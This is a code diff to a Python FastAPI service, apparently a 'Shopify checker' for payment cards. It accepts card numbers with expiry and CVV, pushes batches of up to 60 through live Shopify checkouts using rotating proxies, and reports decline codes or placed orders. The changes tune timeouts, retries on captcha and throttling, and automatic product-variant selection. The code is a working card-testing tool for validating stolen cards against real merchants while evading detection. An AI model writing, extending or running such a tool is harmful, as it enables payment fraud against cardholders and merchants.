-                            error = receipt_data.get('processingError') or {}
+                            error = receipt_data.get('processingError', {})
                             error_type = error.get('__typename', '')
                             if error_type == 'PaymentFailed':
                                 code = error.get('code')
+                                msg = error.get('messageUntranslated', '')
+                                # K3-FIX: generic code pe real message (old-app.py)
+                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
+                                    return True, msg, gateway, total_price, currency
                                 if code:
                                     return True, code, gateway, total_price, currency
                                 return True, 'PAYMENT_FAILED', gateway, total_price, currency
@@ -1293,7 +1249,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             # Shopify ka pollDelay use karo agar available ho
                             server_delay = receipt_data.get('pollDelay')
                             if server_delay and isinstance(server_delay, (int, float)) and server_delay > 0:
-                                poll_wait = min(server_delay / 1000.0, 0.5)  # ms → sec, max 0.5s
+                                poll_wait = min(server_delay / 1000.0, 1.0)  # K2-FIX: server pollDelay respect (max 1s)
                             await asyncio.sleep(poll_wait)
                             continue
 
@@ -1314,7 +1270,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             try:
                 res_json = json.loads(final_text)
-                result = (((res_json.get('data') or {}).get('receipt') or {}).get('processingError') or {}).get('code')
+                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
 
                 if "shopify_payments" in str(res_json):
                     return True, "ORDER_PLACED", gateway, total_price, currency
@@ -1338,18 +1294,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             else:
                 return False, f"Unknown Result", gateway, total_price, currency
 
-    except (asyncio.TimeoutError, CffiTimeout):
+    except asyncio.TimeoutError:
         # FIX 4: Specific timeout handling
         return False, "Request timed out", gateway, total_price, currency
-    except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError, CffiProxyError) as e:
+    except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
         # FIX 4: Specific proxy error
-        return False, f"Proxy Error: Authentication failed - {str(e) or type(e).__name__}", gateway, total_price, currency
-    except (aiohttp.ClientConnectorError, CffiConnectionError) as e:
+        return False, f"Proxy Error: Authentication failed - {str(e)}", gateway, total_price, currency
+    except aiohttp.ClientConnectorError as e:
         # FIX 4: Specific connection error
-        return False, f"Proxy Error: Could not connect - {str(e) or type(e).__name__}", gateway, total_price, currency
-    except (aiohttp.ClientError, CffiCurlError) as e:
+        return False, f"Proxy Error: Could not connect - {str(e)}", gateway, total_price, currency
+    except aiohttp.ClientError as e:
         # FIX 4: Specific network error
-        return False, f"Network error: {str(e) or type(e).__name__}", gateway, total_price, currency
+        return False, f"Network error: {str(e)}", gateway, total_price, currency
     except json.JSONDecodeError as e:
         # FIX 4: Specific JSON error
         return False, f"Invalid response format: {str(e)}", gateway, total_price, currency
@@ -1379,12 +1335,12 @@ def parse_cc_string(cc_string):
 
 # =========== CONFIGURATION ===============
 # Timeout Constants - Consistent behavior ke liye
-TIMEOUT_PRODUCT_FETCH = 15
-TIMEOUT_CHECKOUT = 28
-TIMEOUT_GRAPHQL = 14
-TIMEOUT_VAULT = 12
-TIMEOUT_ENDPOINT = 150
-MAX_BACKOFF_DELAY = 1.5  # Maximum retry delay in seconds
+TIMEOUT_PRODUCT_FETCH = 8
+TIMEOUT_CHECKOUT = 25
+TIMEOUT_GRAPHQL = 12
+TIMEOUT_VAULT = 8
+TIMEOUT_ENDPOINT = 120
+MAX_BACKOFF_DELAY = 1.0  # Maximum retry delay in seconds
 
 # =========== CONCURRENCY ENGINE ===============
 import threading
@@ -1416,7 +1372,7 @@ def get_event_loop():
 
 async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list, start_proxy_idx=0):
     """Process a single card, guarded by the concurrency semaphore, with smart retry & proxy rotation."""
-    max_retries = 5
+    max_retries = 3
     async with _semaphore:
         for attempt in range(max_retries):
             current_proxy = proxy_list[(start_proxy_idx + attempt) % len(proxy_list)] if proxy_list else None
@@ -1426,7 +1382,7 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
 
                 # Un errors ko check karo jinke liye retry karna banta hai
                 error_msg_lower = str(msg).lower()
-                transient_errors = ['proxy error', 'timeout', 'clientoserror', 'clientconnectorerror', 'serverdisconnectederror', 'error processing card', 'failed to get session token', 'request failed', 'throttled', 'captcha_required', 'price_mismatch', 'vault error', 'invalid json in submit response', 'total changed', 'detail_changed', 'CHANGE']
+                transient_errors = ['proxy error', 'timeout', 'clientoserror', 'clientconnectorerror', 'serverdisconnectederror', 'error processing card', 'failed to get session token', 'request failed', 'throttled', 'captcha_required']
                 is_transient = any(t in error_msg_lower for t in transient_errors)
 
                 if not success and is_transient and attempt < max_retries - 1:
@@ -1437,7 +1393,7 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                     continue
 
                 return success, msg, gw, price, cur
-            except (asyncio.TimeoutError, CffiTimeout):
+            except asyncio.TimeoutError:
                 logger.warning(f"[Retry {attempt+1}/{max_retries}] Timeout | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'}")
                 if attempt < max_retries - 1:
                     delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
@@ -1445,22 +1401,22 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                     continue
                 logger.error(f"[FAILED] Timeout after {max_retries} retries | Site: {site_url}")
                 return False, "Request timed out after retries", "UNKNOWN", "0.00", "USD"
-            except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError, CffiProxyError) as e:
+            except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
                 logger.warning(f"[Retry {attempt+1}/{max_retries}] Proxy auth failed | Proxy: {current_proxy[:50] if current_proxy else 'None'} | Error: {str(e)[:100]}")
                 if attempt < max_retries - 1:
                     delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                     await asyncio.sleep(delay)
                     continue
                 logger.error(f"[FAILED] Proxy auth failed after {max_retries} retries | Proxy: {current_proxy}")
-                return False, f"Proxy authentication failed: {str(e) or type(e).__name__}", "UNKNOWN", "0.00", "USD"
-            except (aiohttp.ClientConnectorError, CffiConnectionError, CffiCurlError) as e:
+                return False, f"Proxy authentication failed: {str(e)}", "UNKNOWN", "0.00", "USD"
+            except aiohttp.ClientConnectorError as e:
                 logger.warning(f"[Retry {attempt+1}/{max_retries}] Connection failed | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'} | Error: {str(e)[:100]}")
                 if attempt < max_retries - 1:
                     delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                     await asyncio.sleep(delay)
                     continue
                 logger.error(f"[FAILED] Connection failed after {max_retries} retries | Site: {site_url} | Error: {str(e)}")
-                return False, f"Connection failed: {str(e) or type(e).__name__}", "UNKNOWN", "0.00", "USD"
+                return False, f"Connection failed: {str(e)}", "UNKNOWN", "0.00", "USD"
             except Exception as e:
                 logger.warning(f"[Retry {attempt+1}/{max_retries}] Unexpected error | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'} | Error: {str(e)[:150]}")
                 if attempt < max_retries - 1:
@@ -1504,8 +1460,9 @@ class BatchRequest(BaseModel):
 
 
 # =========== ENDPOINT: SINGLE CARD CHECKER ===============
-@app.get('/SHOPII')
+@app.get('/shopify')
 def shopify_checker(
+    request: Request,
     site: str = Query(...),
     cc: str = Query(...),
     proxy: str = Query(...),
@@ -1514,6 +1471,48 @@ def shopify_checker(
     try:
         cc_string = cc
         proxy_str = proxy
+
+        # Support combined site strings like: site.com & variant=123
+        parsed_site, parsed_variant = parse_site_variant(site)
+        if parsed_site:
+            site = parsed_site
+        if parsed_variant and not variant:
+            variant = parsed_variant
+
+        # Agar FastAPI ne `&` ko separator samajh ke variant alag kar diya,
+        # toh raw query se combined value nikaal ke dobara try karo
+        if not variant:
+            raw_site = extract_raw_site_value(request)
+            if raw_site:
+                parsed_site, parsed_variant = parse_site_variant(raw_site)
+                if parsed_site:
+                    site = parsed_site
+                if parsed_variant:
+                    variant = parsed_variant
+
+        if not variant:
+            # AUTO-PICK: variant nahi diya → site ke products se first variant (bot sends plain site URLs)
+            try:
+                loop = get_event_loop()
+                _fv = asyncio.run_coroutine_threadsafe(
+                    fetch_variants(site, proxy_str), loop
+                )
+                _fv_ok, _fv_data = _fv.result(timeout=25)
+                if _fv_ok and isinstance(_fv_data, list) and _fv_data:
+                    variant = str(_fv_data[0].get("variant_id") or _fv_data[0].get("id", ""))
+                elif _fv_ok and isinstance(_fv_data, str) and _fv_data:
+                    variant = _fv_data  # cached single
+            except Exception as _fv_err:
+                logger.warning(f"[/shopify] auto-variant fail: {_fv_err}")
+        if not variant:
+            raise HTTPException(status_code=400, detail={
+                "error": "Missing 'variant' parameter. Pass it separately or attach to site: site.com & variant=ID",
+                "status": False,
+                "Gateway": "UNKNOWN",
+                "Price": "0.00",
+                "Response": "MISSING_VARIANT",
+                "cc": cc_string
+            })
 
         # Validate proxy format before processing
         test_proxy = parse_proxy(proxy_str)
@@ -1573,16 +1572,24 @@ def batch_checker(data: BatchRequest):
     POST JSON body:
     {
       "site": "https://example.myshopify.com",
+      "variant": "1234567890",
       "cards": ["4111...|12|2030|123", "5200...|06|27|456", ...],
       "proxy": "host:port:user:pass",
       "proxies": ["proxy1", "proxy2", ...]
     }
-    Max 60 cards. If 'proxies' list given, cards rotate across them round-robin.
+    variant is mandatory. Max 60 cards. If 'proxies' list given, cards rotate across them round-robin.
     """
     try:
         site = data.site
         cards = data.cards
         variant_id = data.variant
+
+        # Support combined site strings like: site.com & variant=123
+        parsed_site, parsed_variant = parse_site_variant(site)
+        if parsed_site:
+            site = parsed_site
+        if parsed_variant and not variant_id:
+            variant_id = parsed_variant
 
         # Proxy list support: round-robin across proxies
         proxy_list = data.proxies or []
@@ -1593,6 +1600,8 @@ def batch_checker(data: BatchRequest):
             raise HTTPException(status_code=400, detail={"error": "Missing 'proxy' or 'proxies' field. Proxy is mandatory.", "status": False})
         if not site:
             raise HTTPException(status_code=400, detail={"error": "Missing 'site' field", "status": False})
+        if not variant_id:
+            raise HTTPException(status_code=400, detail={"error": "Missing 'variant' field. Pass it separately or attach to site: site.com & variant=ID", "status": False})
         if not cards or not isinstance(cards, list):
             raise HTTPException(status_code=400, detail={"error": "Missing or invalid 'cards' array", "status": False})
         if len(cards) > MAX_CONCURRENT:
@@ -1612,29 +1621,34 @@ def batch_checker(data: BatchRequest):
         async def _run_batch():
             # Local copy — nonlocal nahi, taaki concurrent requests mix na hon
             local_variant_id = variant_id
+            auto_variants = None
 
-            # Fetch variant once for the entire batch to save massive duplicate network requests
+            # Fetch 10-15 variants once for the entire batch
             if not local_variant_id:
-                info = await fetch_products(site, proxy_list[0] if proxy_list else None)
-                if isinstance(info, dict) and info.get('variant_id'):
-                    local_variant_id = info['variant_id']
+                ok, variants = await fetch_variants(site, proxy_list[0] if proxy_list else None)
+                if ok:
+                    auto_variants = variants
                 else:
-                    err_msg = info[1] if isinstance(info, tuple) else "Failed to fetch product / variant_id"
+                    err_msg = variants if isinstance(variants, str) else "Failed to fetch variants"
                     return [(cs, False, err_msg, "UNKNOWN", "0.00", "USD", 0.0) for cs, parts, idx in parsed]
 
             tasks = []
-            for cc_string, parts, idx in parsed:
+            for i, (cc_string, parts, idx) in enumerate(parsed):
                 if parts is None:
                     async def _bad(cs=cc_string):
                         return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD", 0.0
                     tasks.append(_bad())
                 else:
-                    async def _check(cs=cc_string, p=parts, current_idx=idx, vid=local_variant_id):
+                    if auto_variants:
+                        vid = auto_variants[i % len(auto_variants)]['variant_id']
+                    else:
+                        vid = local_variant_id
+                    async def _check(cs=cc_string, p=parts, current_idx=idx, current_vid=vid):
                         try:
                             _t = time.time()
                             success, msg, gw, price, cur = await _throttled_process(
                                 p['cc'], p['mes'], p['ano'], p['cvv'],
-                                site, vid, proxy_list, current_idx
+                                site, current_vid, proxy_list, current_idx
                             )
                             return cs, success, msg, gw, price, cur, round(time.time() - _t, 2)
                         except Exception as ex:
@@ -1669,8 +1683,8 @@ def status():
         "status": "online",
         "max_concurrent": MAX_CONCURRENT,
         "endpoints": {
-            "single": "GET /SHOPII?site=...&cc=...&proxy=...",
-            "batch":  "POST /batch {site, cards[], proxy}",
+            "single": "GET /shopify?site=...&cc=...&proxy=...&variant=...",
+            "batch":  "POST /batch {site, variant, cards[], proxy}",
             "status": "GET /status"
         }
     }
@@ -1685,5 +1699,5 @@ def health():
 # =========== MAIN EXECUTION ===============
 if __name__ == "__main__":
     get_event_loop()  # pre-start the background loop
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 8080))
     uvicorn.run(app, host='0.0.0.0', port=port, access_log=False)
